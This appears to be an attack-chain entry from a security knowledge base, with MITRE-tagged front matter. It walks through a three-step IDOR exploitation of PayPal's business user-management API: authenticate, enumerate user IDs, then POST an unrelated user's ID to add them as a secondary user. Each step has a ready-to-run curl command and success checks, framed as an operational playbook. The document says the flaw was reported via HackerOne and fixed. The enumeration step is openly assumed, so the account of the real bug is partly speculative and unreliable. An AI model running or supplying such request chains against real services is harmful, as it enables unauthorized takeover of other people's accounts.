---
tags:
  - idor
  - api
  - paypal
  - unauthorized-access
type: attack_chain
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Initial Access]]'
  - '[[Privilege Escalation]]'
  - '[[Discovery]]'
commands:
  - '[[commands/curl-authenticate-paypal]]'
  - '[[commands/curl-enumerate-users]]'
  - '[[commands/curl-add-secondary-user]]'
platforms:
  - Web
complexity: medium
procedures:
  - '[[procedures/Authenticate-to-PayPal-Business-API]]'
  - '[[procedures/Identify-Target-User-for-IDOR-Exploitation]]'
  - '[[procedures/Exploit-IDOR-to-Assign-Secondary-User]]'
step_count: 3
techniques:
  - '[[Valid Accounts]]'
  - '[[Account Discovery]]'
  - '[[Exploit Public-Facing Application]]'
description: >-
  Exploitation of an IDOR vulnerability in PayPal's business account management
  API to add secondary users from unrelated accounts without authorization
skill_level: intermediate
impact_level: high
id: 9f446d7a-53fe-4c6d-986d-0d4792a8757e
created_at: '2025-12-11T06:10:30.382Z'
updated_at: '2025-12-11T06:10:30.382Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[TA0001]]'
  - '[[TA0004]]'
  - '[[TA0007]]'
mitre_techniques:
  - '[[T1078]]'
  - '[[T1087]]'
  - '[[T1190]]'
---
# IDOR in PayPal Business API Allowing Unauthorized Secondary User Addition

## Overview

This attack chain demonstrates the exploitation of an Insecure Direct Object Reference (IDOR) vulnerability in PayPal's business account management API. The vulnerability allows a business account owner to add secondary users from unrelated accounts without proper authorization checks, potentially granting unauthorized access to user login functions. The attack involves authenticating to the API, identifying a target user, and manipulating the API request to assign the user to the attacker's business account. This was reported via HackerOne and remediated by PayPal with no evidence of prior abuse.

## Attack Flow

```mermaid
graph LR
    A[Initial Authentication] --> B[User Discovery] --> C[IDOR Exploitation] --> D[Unauthorized Access]
    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools
- [[tools/curl]]

### Target Environment
- Web-based API
- PayPal Business Accounts API
- Network access to https://www.paypal.com

### Initial Access Requirements
- Valid PayPal business account credentials
- Access to API endpoint
- Knowledge of target user identifiers

## Step 1: Authenticate to PayPal Business API - [[procedures/Authenticate-to-PayPal-Business-API]]

### Objective

Obtain an authentication token to access the PayPal Business API as a business account owner.

### Instructions

Use [[commands/curl-authenticate-paypal]] to authenticate and retrieve a bearer token:

```bash
curl -X POST https://api.paypal.com/v1/oauth2/token \
  -H "Accept: application/json" \
  -H "Accept-Language: en_US" \
  -u "client_id:client_secret" \
  -d "grant_type=client_credentials"
```

Capture the access_token from the response for use in subsequent requests.

### Validation

Confirm a valid bearer token is returned in the JSON response.

## Step 2: Identify Target User for IDOR Exploitation - [[procedures/Identify-Target-User-for-IDOR-Exploitation]]

### Objective

Discover or enumerate a target user ID from an unrelated account to exploit the IDOR.

### Instructions

Use [[commands/curl-enumerate-users]] to query for potential user IDs (assuming enumeration is possible via related endpoints):

```bash
curl -X GET https://www.paypal.com/businessmanage/users/api/v1/users \
  -H "Authorization: Bearer your_access_token" \
  -H "Content-Type: application/json"
```

Analyze the response for user IDs that can be manipulated.

### Validation

Verify that user details are returned, identifying a target user ID not associated with your account.

## Step 3: Exploit IDOR to Assign Secondary User - [[procedures/Exploit-IDOR-to-Assign-Secondary-User]]

### Objective

Manipulate the API request to add the target user as a secondary user to your business account without authorization.

### Instructions

Use [[commands/curl-add-secondary-user]] to send a POST request with the manipulated user ID:

```bash
curl -X POST https://www.paypal.com/businessmanage/users/api/v1/users \
  -H "Authorization: Bearer your_access_token" \
  -H "Content-Type: application/json" \
  -d '{"user_id": "target_user_id", "role": "secondary"}'
```

This exploits the IDOR by directly referencing the unrelated user's ID.

### Validation

Check if the user is successfully added and access to their login functions is granted.

## Attack Chain Summary

### Key Achievements
1. Gained authenticated access to PayPal Business API
2. Identified and manipulated user references via IDOR
3. Achieved unauthorized assignment of secondary users leading to privilege access
